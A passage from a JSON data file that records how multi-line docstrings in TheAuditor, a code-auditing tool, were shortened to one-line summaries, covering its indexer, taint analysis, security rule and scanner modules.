    "original": "\"\"\"Build edges connecting Express middleware chains.\n\n        Creates edges showing data flow through middleware execution order.\n        For a route with validateBody -> authenticate -> controller,\n        creates edges showing req.body flows through the chain.\n        \"\"\"",
    "truncated": "\"\"\"Build edges connecting Express middleware chains.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize the database manager.\n\n        Args:\n            db_path: Path to the SQLite database file\n            batch_size: Size of batches for insert operations\n        \"\"\"",
    "truncated": "\"\"\"Initialize the database manager.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a file record to the batch.\n\n        ZERO FALLBACK POLICY: No deduplication.\n        If orchestrator sends same file twice, SQLite UNIQUE constraint catches it.\n        Symlinks/junction points should be resolved at FileWalker layer, not here.\n        \"\"\"",
    "truncated": "\"\"\"Add a file record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a Docker image record to the batch.\n\n        Note: Ports, env vars, build args go to junction tables:\n        - dockerfile_ports (via add_dockerfile_port)\n        - dockerfile_env_vars (via add_dockerfile_env_var)\n        \"\"\"",
    "truncated": "\"\"\"Add a Docker image record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a Terraform resource record to the batch.\n\n        Note: Properties, depends_on, sensitive flags go to junction tables:\n        - terraform_resource_properties (via add_terraform_resource_property)\n        - terraform_resource_deps (via add_terraform_resource_dep)\n        \"\"\"",
    "truncated": "\"\"\"Add a Terraform resource record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a GitHub Actions job dependency edge (needs: relationship).\n\n        Args:\n            job_id: FK to github_jobs (dependent job)\n            needs_job_id: FK to github_jobs (dependency job)\n        \"\"\"",
    "truncated": "\"\"\"Add a GitHub Actions job dependency edge (needs: relationship).\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Node.js/TypeScript/React/Vue database operations.\n\nThis module contains add_* methods for NODE_TABLES defined in schemas/node_schema.py.\nHandles 27 Node.js tables including TypeScript, React, Vue, Angular, Sequelize,\nBullMQ, and 10 junction tables for normalized extraction data.\n\"\"\"",
    "truncated": "\"\"\"Node.js/TypeScript/React/Vue database operations.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a Python branch (if/match/raise/except/finally) to the batch.\n\n        Args:\n            branch_kind: 'if', 'match', 'raise', 'except', 'finally' (discriminator)\n            branch_type: Extractor's subtype - NOT overwritten\n        \"\"\"",
    "truncated": "\"\"\"Add a Python branch (if/match/raise/except/finally) to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a Python state mutation to the batch.\n\n        Args:\n            mutation_kind: 'instance', 'class', 'global', 'argument', 'augmented' (discriminator)\n            mutation_type: Extractor's subtype - NOT overwritten\n        \"\"\"",
    "truncated": "\"\"\"Add a Python state mutation to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a Python Literal/Overload type to the batch.\n\n        Args:\n            literal_kind: 'literal', 'overload'\n            literal_type: Preserved subtype from extractor\n        \"\"\"",
    "truncated": "\"\"\"Add a Python Literal/Overload type to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a Python test case to the batch.\n\n        Args:\n            test_kind: Discriminator: 'unittest', 'assertion'\n            test_type: Extractor's subtype (preserved)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python test case to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a Python operator usage to the batch.\n\n        Args:\n            operator_kind: Discriminator: 'binary', 'unary', 'membership', 'chained', 'ternary', 'walrus', 'matmul'\n            operator_type: Extractor's subtype (preserved)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python operator usage to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a Python collection operation to the batch.\n\n        Args:\n            collection_kind: Discriminator: 'dict', 'list', 'set', 'string', 'builtin'\n            collection_type: Extractor's subtype (preserved)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python collection operation to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add a Python stdlib usage to the batch.\n\n        Args:\n            stdlib_kind: Discriminator: 're', 'json', 'datetime', 'pathlib', 'logging', 'threading', 'contextlib', 'typing', 'weakref', 'contextvars'\n            usage_type: Extractor's subtype (preserved)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python stdlib usage to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Add an advanced Python import pattern to the batch.\n\n        Args:\n            import_kind: Discriminator: 'static', 'dynamic', 'namespace', 'module_attr', 'export'\n            import_type: Extractor's subtype (preserved)\n        \"\"\"",
    "truncated": "\"\"\"Add an advanced Python import pattern to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize the extractor.\n\n        Args:\n            root_path: Project root path\n            ast_parser: Optional AST parser instance (for language extractors)\n        \"\"\"",
    "truncated": "\"\"\"Initialize the extractor.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize the registry and discover extractors.\n\n        Args:\n            root_path: Project root path\n            ast_parser: Optional AST parser instance\n        \"\"\"",
    "truncated": "\"\"\"Initialize the registry and discover extractors.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Extract package.json to package_configs and junction tables.\n\n        Args:\n            file_path: Path to package.json\n            content: JSON content as string\n        \"\"\"",
    "truncated": "\"\"\"Extract package.json to package_configs and junction tables.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/github_actions.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Extract workflow-level metadata to database.\n\n        Args:\n            workflow_path: Path to workflow file\n            workflow_data: Parsed YAML workflow dict\n        \"\"\"",
    "truncated": "\"\"\"Extract workflow-level metadata to database.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/github_actions.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Extract jobs and their steps to database.\n\n        Args:\n            workflow_path: Path to workflow file\n            jobs_data: Jobs dict from workflow YAML\n        \"\"\"",
    "truncated": "\"\"\"Extract jobs and their steps to database.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/rust.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize the Rust extractor.\n\n        Args:\n            root_path: Project root path\n            ast_parser: Optional AST parser (unused, tree-sitter manages its own)\n        \"\"\"",
    "truncated": "\"\"\"Initialize the Rust extractor.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/sql.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"SQL file extractor.\n\nHandles extraction of SQL-specific elements including:\n- SQL object definitions (tables, indexes, views, functions)\n- SQL queries and their structure\n\"\"\"",
    "truncated": "\"\"\"SQL file extractor.\"\"\""
  },
  {
    "file": "theauditor/indexer/metadata_collector.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Metadata collector for code churn and test coverage.\n\nThis module collects temporal (git history) and quality (test coverage) metadata\nto provide additional factual dimensions for the FCE correlation engine.\nMaintains Truth Courier principles - reports only facts, no interpretation.\n\"\"\"",
    "truncated": "\"\"\"Metadata collector for code churn and test coverage.\"\"\""
  },
  {
    "file": "theauditor/indexer/orchestrator.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Store loaded frameworks in database.\n\n        Stores framework information, safe sinks, and taint patterns.\n        Taint patterns (sources/sinks) are seeded here during indexing so\n        the TaintRegistry can load them at analysis time (Database-First architecture).\n        \"\"\"",
    "truncated": "\"\"\"Store loaded frameworks in database.\"\"\""
  },
  {
    "file": "theauditor/indexer/orchestrator.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Process a single file.\n\n        Args:\n            file_info: File metadata\n            js_ts_cache: Cache of pre-parsed JS/TS ASTs\n        \"\"\"",
    "truncated": "\"\"\"Process a single file.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/utils.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Generate CREATE INDEX statements.\n\n        Supports both regular and partial indexes:\n        - Regular: (idx_name, [cols])\n        - Partial: (idx_name, [cols], where_clause)\n        \"\"\"",
    "truncated": "\"\"\"Generate CREATE INDEX statements.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/utils.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n        Validate that actual database table matches this schema.\n\n        Returns:\n            (is_valid, [error_messages])\n        \"\"\"",
    "truncated": "\"\"\"Validate that actual database table matches this schema.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/__init__.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize DataStorer with database manager and counts dict.\n\n        Args:\n            db_manager: DatabaseManager instance from orchestrator\n            counts: Shared counts dictionary for statistics tracking\n        \"\"\"",
    "truncated": "\"\"\"Initialize DataStorer with database manager and counts dict.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Store Python protocol implementations with junction table for methods.\n\n        CRITICAL: Uses parent ID return pattern for junction table FK.\n        1. Insert parent -> get protocol_id\n        2. Insert each method into python_protocol_methods with protocol_id FK\n        \"\"\"",
    "truncated": "\"\"\"Store Python protocol implementations with junction table for methods.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Store Python type definitions with junction table for TypedDict fields.\n\n        CRITICAL: Uses parent ID return pattern for junction table FK.\n        1. Insert parent -> get typeddict_id\n        2. If type_kind='typed_dict', insert fields into python_typeddict_fields\n        \"\"\"",
    "truncated": "\"\"\"Store Python type definitions with junction table for TypedDict fields.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Store Python security findings (sql_injection/command_injection/etc).\n\n        Two-discriminator pattern:\n        - finding_kind: Table discriminator (auth/command_injection/crypto/dangerous_eval/jwt/password/path_traversal/sql_injection)\n        - finding_type: Extractor's subtype (preserved from extractor)\n        \"\"\"",
    "truncated": "\"\"\"Store Python security findings (sql_injection/command_injection/etc).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Store Python test cases (unittest/pytest/assertion).\n\n        Two-discriminator pattern:\n        - test_kind: Table discriminator (unittest/assertion)\n        - test_type: Extractor's subtype (preserved from extractor)\n        \"\"\"",
    "truncated": "\"\"\"Store Python test cases (unittest/pytest/assertion).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Store Python operators (binary/unary/membership/chained/ternary/walrus/matmul).\n\n        Two-discriminator pattern:\n        - operator_kind: Table discriminator (binary/unary/membership/chained/ternary/walrus/matmul)\n        - operator_type: Extractor's subtype (preserved from extractor)\n        \"\"\"",
    "truncated": "\"\"\"Store Python operators (binary/unary/membership/chained/ternary/walrus/matmul).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Store Python collection operations (dict/list/set/string/builtin).\n\n        Two-discriminator pattern:\n        - collection_kind: Table discriminator (dict/list/set/string/builtin)\n        - collection_type: Extractor's subtype (preserved from extractor)\n        \"\"\"",
    "truncated": "\"\"\"Store Python collection operations (dict/list/set/string/builtin).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Store Python stdlib usage (re/json/datetime/pathlib/logging/threading/etc).\n\n        Two-discriminator pattern:\n        - stdlib_kind: Table discriminator (re/json/pathlib/logging/threading/contextlib/etc)\n        - usage_type: Extractor's subtype (preserved from extractor)\n        \"\"\"",
    "truncated": "\"\"\"Store Python stdlib usage (re/json/datetime/pathlib/logging/threading/etc).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Store advanced Python import patterns (static/dynamic/namespace/module_attr/export).\n\n        Two-discriminator pattern:\n        - import_kind: Table discriminator (static/dynamic/namespace/module_attr/export)\n        - import_type: Extractor's subtype (preserved from extractor)\n        \"\"\"",
    "truncated": "\"\"\"Store advanced Python import patterns (static/dynamic/namespace/module_attr/export).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Store Python expression patterns (slice/tuple/unpack/none/truthiness/format/etc).\n\n        Two-discriminator pattern:\n        - expression_kind: Table discriminator (slice/tuple/unpack/none/truthiness/format/ellipsis/bytes/exec/yield/await/resource)\n        - expression_type: Extractor's subtype (preserved from extractor)\n        \"\"\"",
    "truncated": "\"\"\"Store Python expression patterns (slice/tuple/unpack/none/truthiness/format/etc).\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n        Initialize insights analyzer with optional weight configuration.\n\n        Args:\n            weights: Custom weights for hotspot scoring\n        \"\"\"",
    "truncated": "\"\"\"Initialize insights analyzer with optional weight configuration.\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Optional graph interpretation and scoring.\n\n    This class provides subjective metrics and recommendations based on\n    graph topology. All methods here involve interpretation and scoring,\n    not just raw data extraction.\n    \"\"\"",
    "truncated": "\"\"\"Optional graph interpretation and scoring.\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Extract TypeScript type annotation coverage from type_annotations table.\n\n    Returns dict with keys: type_annotation_count, any_type_count, unknown_type_count,\n                           generic_type_count, type_coverage_ratio\n    \"\"\"",
    "truncated": "\"\"\"Extract TypeScript type annotation coverage from type_annotations table.\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Extract AST-based complexity metrics from the symbols table.\n\n    Returns dict with keys: function_count, class_count, call_count,\n                           try_except_count, async_def_count\n    \"\"\"",
    "truncated": "\"\"\"Extract AST-based complexity metrics from the symbols table.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/cli.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Train ML models from artifacts.\n\n    Args:\n        session_dir: Optional path to Claude Code session logs (enables Tier 5 agent behavior features)\n        graveyard_path: Optional path to comment_graveyard.json (enables comment hallucination detection)\n    \"\"\"",
    "truncated": "\"\"\"Train ML models from artifacts.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Extract TypeScript type annotation coverage from type_annotations table.\n\n    Returns dict with keys: type_annotation_count, any_type_count, unknown_type_count,\n                           generic_type_count, type_coverage_ratio\n    \"\"\"",
    "truncated": "\"\"\"Extract TypeScript type annotation coverage from type_annotations table.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Extract AST-based complexity metrics from the symbols table.\n\n    Returns dict with keys: function_count, class_count, call_count,\n                           try_except_count, async_def_count\n    \"\"\"",
    "truncated": "\"\"\"Extract AST-based complexity metrics from the symbols table.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Parse raw/graph_metrics.json for centrality scores.\n\n    Returns dict mapping file paths to centrality scores:\n    {\"auth.py\": 0.85, \"service.py\": 0.62}\n    \"\"\"",
    "truncated": "\"\"\"Parse raw/graph_metrics.json for centrality scores.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Export classification result to JSON file.\n\n        Args:\n            result: ClassificationResult to export\n            output_path: Path to write JSON file\n        \"\"\"",
    "truncated": "\"\"\"Export classification result to JSON file.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize journal writer.\n\n        Args:\n            journal_path: Path to the journal file\n            history_dir: Optional history directory for archival copies\n        \"\"\"",
    "truncated": "\"\"\"Initialize journal writer.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"JavaScript/TypeScript semantic parser using the TypeScript Compiler API.\n\nThis module replaces Tree-sitter's syntactic parsing with true semantic analysis\nusing the TypeScript compiler, enabling accurate type analysis, symbol resolution,\nand cross-file understanding for JavaScript and TypeScript projects.\n\"\"\"",
    "truncated": "\"\"\"JavaScript/TypeScript semantic parser using the TypeScript Compiler API.\"\"\""
  },
  {
    "file": "theauditor/module_resolver.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize resolver with database path - NO filesystem access.\n\n        Args:\n            project_root: Deprecated parameter, kept for compatibility\n            db_path: Path to the indexed database\n        \"\"\"",
    "truncated": "\"\"\"Initialize resolver with database path - NO filesystem access.\"\"\""
  },
  {
    "file": "theauditor/pattern_loader.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize pattern loader.\n\n        Args:\n            patterns_dir: Directory containing pattern YAML files.\n                         Defaults to theauditor/patterns/\n        \"\"\"",
    "truncated": "\"\"\"Initialize pattern loader.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Update task assignee.\n\n        Args:\n            task_id: ID of task to update\n            assigned_to: New assignee name\n        \"\"\"",
    "truncated": "\"\"\"Update task assignee.\"\"\""
  },
  {
    "file": "theauditor/refactor/profiles.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Query sources with batched SQL and regex boundary filtering.\n\n        Performance: Batches terms into chunks of 50 to reduce query count from\n        O(terms * sources) to O(ceil(terms/50) * sources). Then filters results\n        with word-boundary regex to eliminate false positives like 'id' matching 'grid'.\n        \"\"\"",
    "truncated": "\"\"\"Query sources with batched SQL and regex boundary filtering.\"\"\""
  },
  {
    "file": "theauditor/rules/graphql/query_depth.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Check for unrestricted query depth (DoS risk).\n\n    Detects:\n    - List fields returning complex types (potential nested queries)\n    - Lack of depth limiting configuration\n    \"\"\"",
    "truncated": "\"\"\"Check for unrestricted query depth (DoS risk).\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize the orchestrator.\n\n        Args:\n            project_path: Root path of the project being analyzed\n            db_path: Optional path to the database (defaults to .pf/repo_index.db)\n        \"\"\"",
    "truncated": "\"\"\"Initialize the orchestrator.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Find sleep operations in loops.\n\n        Schema: cfg_blocks(id, file, function_name, block_type, start_line, end_line, condition_expr)\n                function_call_args(file, line, caller_function, callee_function,\n                                   argument_index, argument_expr, param_name)\n        \"\"\"",
    "truncated": "\"\"\"Find sleep operations in loops.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Find lock-related issues.\n\n        Schema: function_call_args(file, line, caller_function, callee_function,\n                                   argument_index, argument_expr, param_name)\n                assignments(file, line, target_var, source_expr, source_vars, in_function)\n        \"\"\"",
    "truncated": "\"\"\"Find lock-related issues.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/__init__.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Vue.js-specific rule detectors for TheAuditor.\n\nThis package contains database-first rules for detecting Vue.js\nanti-patterns, performance issues, and security vulnerabilities\nacross Options API, Composition API, Vuex, and Pinia.\n\"\"\"",
    "truncated": "\"\"\"Vue.js-specific rule detectors for TheAuditor.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/component_analyze.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Find v-for loops without :key attribute.\n\n    Uses BOTH vue_directives (authoritative) and symbols (heuristic) to\n    maximize detection coverage. No conditional logic - executes both strategies\n    unconditionally and deduplicates findings.\n    \"\"\"",
    "truncated": "\"\"\"Find v-for loops without :key attribute.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/express_xss_analyze.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Check for res.send() with HTML content containing user input.\n\n    Modernization (2025-11-22):\n    - Performance: Push HTML tag and template literal filtering to SQL\n    - Memory safe: Stream results with cursor iteration instead of fetchall()\n    \"\"\"",
    "truncated": "\"\"\"Check for res.send() with HTML content containing user input.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/react_xss_analyze.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Check if this is a React application.\n\n    Modernization (2025-11-22):\n    - Removed LIMIT 1000 symbol scan fallback (non-deterministic, violates ZERO FALLBACK POLICY)\n    - Trust the indexer: if frameworks table is empty AND react_components is empty, it's not React\n    \"\"\"",
    "truncated": "\"\"\"Check if this is a React application.\"\"\""
  },
  {
    "file": "theauditor/session/analyzer.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Analyze a single session and return stats + findings.\n\n        Args:\n            session: Parsed session object\n            comment_graveyard_path: Optional path to comment_graveyard.json for hallucination detection\n        \"\"\"",
    "truncated": "\"\"\"Analyze a single session and return stats + findings.\"\"\""
  },
  {
    "file": "theauditor/session/diff_scorer.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize diff scorer.\n\n        Args:\n            db_path: Path to repo_index.db for RCA queries\n            project_root: Root directory of project being analyzed\n        \"\"\"",
    "truncated": "\"\"\"Initialize diff scorer.\"\"\""
  },
  {
    "file": "theauditor/session/store.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize session execution store.\n\n        Args:\n            db_path: Path to session database (default: .pf/ml/session_history.db)\n            json_dir: Directory for JSON files (default: .pf/ml/session_analysis/)\n        \"\"\"",
    "truncated": "\"\"\"Initialize session execution store.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Register a sanitizer pattern, optionally language-specific.\n\n        Args:\n            pattern: Sanitizer function name (e.g., 'sanitize', 'escape')\n            language: Optional language identifier (None = applies to all languages)\n        \"\"\"",
    "truncated": "\"\"\"Register a sanitizer pattern, optionally language-specific.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Trace all flows from a single entry point using DFS with Adaptive Throttling.\n\n        Args:\n            entry_id: Entry point node ID (format: file::function::variable)\n            exit_nodes: Set of exit node IDs to trace to\n        \"\"\"",
    "truncated": "\"\"\"Trace all flows from a single entry point using DFS with Adaptive Throttling.\"\"\""
  },
  {
    "file": "theauditor/taint/type_resolver.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize TypeResolver.\n\n        Args:\n            graph_cursor: Cursor for graphs.db (for node metadata)\n            repo_cursor: Cursor for repo_index.db (for api_endpoints). Optional.\n        \"\"\"",
    "truncated": "\"\"\"Initialize TypeResolver.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Extract variable names from property values.\n\n        Searches for Terraform variable interpolations:\n        - Modern: var.NAME\n        - Legacy: ${var.NAME}\n        \"\"\"",
    "truncated": "\"\"\"Extract variable names from property values.\"\"\""
  },
  {
    "file": "theauditor/terraform/parser.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Deprecated Terraform parser placeholder.\n\nTerraform extraction now relies entirely on the tree-sitter-powered\n``TerraformExtractor``. This module is kept for backwards compatibility so that\nlegacy imports fail with a clear error instead of ``ModuleNotFoundError``.\n\"\"\"",
    "truncated": "\"\"\"Deprecated Terraform parser placeholder.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Process non-AST files with regex patterns.\n\n        Args:\n            files: List of (path, ext, sha256) tuples\n            categories: Optional pattern categories to load\n        \"\"\"",
    "truncated": "\"\"\"Process non-AST files with regex patterns.\"\"\""
  },
  {
    "file": "theauditor/utils/error_handler.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Centralized error handler for TheAuditor commands.\n\nThis module provides a decorator that captures detailed error information\nincluding full tracebacks, while presenting clean error messages to users.\nAll detailed debugging information is logged to .pf/error.log.\n\"\"\"",
    "truncated": "\"\"\"Centralized error handler for TheAuditor commands.\"\"\""
  },
  {
    "file": "theauditor/utils/temp_manager.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Centralized temporary file management for TheAuditor.\n\nThis module provides a custom temporary directory solution that avoids\nWSL2/Windows permission issues by creating temp files within the project's\n.auditor_venv directory instead of system temp.\n\"\"\"",
    "truncated": "\"\"\"Centralized temporary file management for TheAuditor.\"\"\""
  },
  {
    "file": "theauditor/venv_install.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Inject TheAuditor agent trigger block into AGENTS.md and CLAUDE.md in target project root.\n\n    Creates files if they don't exist, or injects trigger block if not already present.\n    This tells AI assistants where to find specialized agent workflows.\n    \"\"\"",
    "truncated": "\"\"\"Inject TheAuditor agent trigger block into AGENTS.md and CLAUDE.md in target project root.\"\"\""
  },
  {
    "file": "theauditor/venv_install.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Get platform-specific paths for venv Python and aud executables.\n\n    Returns:\n        (python_exe, aud_exe) paths\n    \"\"\"",
    "truncated": "\"\"\"Get platform-specific paths for venv Python and aud executables.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize scanner.\n\n        Args:\n            db_path: Path to repo_index.db\n            offline: If True, use offline databases only (no network)\n        \"\"\"",
    "truncated": "\"\"\"Initialize scanner.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Write findings to JSON file for AI readability.\n\n        Args:\n            findings: List of validated vulnerability findings\n            output_path: Path to output JSON file (default: ./.pf/raw/vulnerabilities.json)\n        \"\"\"",
    "truncated": "\"\"\"Write findings to JSON file for AI readability.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Write vulnerability findings to JSON file.\n\n    Args:\n        vulnerabilities: List of vulnerability findings\n        output_path: Path to output JSON file\n    \"\"\"",
    "truncated": "\"\"\"Write vulnerability findings to JSON file.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Extract property accesses from Python AST.\n\n    In Python, these would be attribute accesses.\n    Currently returns empty list for consistency.\n    \"\"\"",
    "truncated": "\"\"\"Extract property accesses from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Convert AST node to approximate source text.\n\n    This is a best-effort reconstruction. For accurate source text,\n    use ast.get_source_segment() with original source code.\n    \"\"\"",
    "truncated": "\"\"\"Convert AST node to approximate source text.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/orm_extractors.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect Flask blueprint declarations.\n\n    TEMPORARY: This function logically belongs in flask_extractors.py\n    Will be moved to flask_extractors.py in future PR to avoid scope creep.\n    \"\"\"",
    "truncated": "\"\"\"Detect Flask blueprint declarations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/context.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get all nodes (fallback for complex patterns).\n\n        Returns:\n            All nodes in tree\n        \"\"\"",
    "truncated": "\"\"\"Get all nodes (fallback for complex patterns).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/node_index.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Build index of all nodes by type.\n\n        Args:\n            tree: AST tree to index\n        \"\"\"",
    "truncated": "\"\"\"Build index of all nodes by type.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/node_index.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get count of each node type.\n\n        Returns:\n            Dictionary mapping node type names to counts\n        \"\"\"",
    "truncated": "\"\"\"Get count of each node type.\"\"\""
  },
  {
